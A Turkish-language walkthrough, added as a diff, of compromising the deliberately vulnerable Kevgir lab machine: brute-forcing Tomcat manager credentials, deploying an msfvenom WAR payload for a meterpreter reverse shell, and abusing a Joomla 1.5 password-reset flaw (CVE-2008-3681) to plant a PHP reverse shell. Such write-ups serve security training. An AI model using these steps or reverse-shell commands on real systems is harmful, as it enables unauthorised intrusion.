@@ -1,0 +1,42 @@
+Kevgir makinesini ayağa kaldırdıktan sonra,
+Nessus ve Nmap taraması çıktılarını görüntüleyip makine üzerinde çalışan servisleri ve açık olan portları görüntüledim.
+
+1) Tomcat zafiyeti ve sömürülmesi
+
+"8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1"
+Nmap ile yukarıdaki çıktı sonucunda, tomcat servisini tarayıcan görüntüledim ve admin panelinin olduğunu gördüm.
+metasploit yazılımından search tomcat komutuyla mevcut zafiyetleri görüntüledim,
+"auxiliary/scanner/http/tomcat_mgr_login" modülünü kullanarak basit bir brute-force saldırısı yaptım,
+Aşağıddaki login bilgilerini buldum.
+[+] 192.168.2.128:8080 - Login Successful: tomcat:tomcat
+Sonrasında bu bilgilerle tarayıcdan arayüze giriş yaptım.
+Arayüze giriş yaptıktan sonra panelden war uzantılı dosya yükleyebildiğimi gördüm.
+msfvenom kullanarak zararlı bir .war uzantılı dosya ürettim.
+"msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.161 lport=1234 -f war -o hahaha.war"
+Bu dosyayı elle arayüzden panele deploy ettim.
+Tekrar metasploit kullanarak hedefi dinleme modülünü çalıştırdım.
+"use exploit/multi/handler" ardından set PAYLOAD linux/x86/meterpreter/reverse_tcp" payloadını ekledim.
+Gerekli ayarları yaptım ve modülü çalıştırıp hedefi dinlemeye aldım.
+Manuel olarak arayüzden deploy ettiğim zararlı .war uzantılı dosyayı çalıştırabilmek için;
+öncelikle kaydettiğim dosyanın bulunduğu dizinine giderek jar xvf komutuyla içindeki asıl zararlı dosyayının uzantısını tarayıcıda çalıştırmak için kopyaladım.
+"knutdlxuboyv.jsp" gibi. Tarayıcan uzantıya ekleyip çalıştırdım.
+Veee mutlu son, "-Hacker Voice: I'm In!" dinlediğimiz meterpreter reverse_shell sessionı getirdi..
+
+2) 8081 portunda çalışan joomla! uygulamasının hacklenmesi
+
+Nmap taraması sonucunda 8081 portunda çalışan joomla uygulamasını
+joomscan -u http://192.168.2.128:8081 komutuyla terminalden çalıştırdım.
+Karşıma bir sürü zafiyet çıktı ve araştırmalarım sonucunda;
+Joomla! 1.5.x - (Token) Remote Admin Change Password
+CVE : CVE-2008-3681
+EDB : https://www.exploit-db.com/exploits/6234/
+zafiyetinin sömürülmesini buldum.
+
+Bunun için paylaşılan linkten exploit-db sitesine gittim ve adım adım yapılması gerekenleri uyguladım.
+Öncelikle http://192.168.2.128:8081/index.php?option=com_user&view=reset&layout=confirm sayfasına gidip belirtilen token kutucuğuna ' işaretiyle admin password reset sayfasına geldim :)
+Buradan panele admin olarak girebilmek için parola belirledim.
+Sonra tarama sonucunda çıkan /administrator/ dizinine gelip joomla uygulamasının giriş admin login sayfasından belirlediğim parolayla içeriye girdim.
+Buradan kendi makinemde shell alabilmek için,
+Template sekmesine gelip zararlı php kodunu (msfvenom -p php/meterpreter/reverse_tcp ..) kopyala yapıştırı kullanıp içeriye yükledim.
+msfconsole da kullandığım exploit ve payload ı aktif edip, uygulamadan shell aldım!
+(exploit/multi/handler --- set PAYLOAD php/meterpreter/reverse_shell)
